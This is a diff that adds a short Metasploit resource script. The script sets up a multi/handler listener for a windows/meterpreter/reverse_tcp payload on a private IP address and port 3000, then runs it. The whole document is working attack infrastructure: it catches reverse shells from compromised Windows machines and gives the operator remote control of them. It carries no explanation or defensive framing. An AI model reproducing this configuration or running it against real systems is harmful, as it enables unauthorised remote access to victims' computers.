@@ -1,0 +1,5 @@
+use exploit/multi/handler
+	set PAYLOAD windows/meterpreter/reverse_tcp
+	set LHOST 10.1.1.227
+	set LPORT 3000
+	run
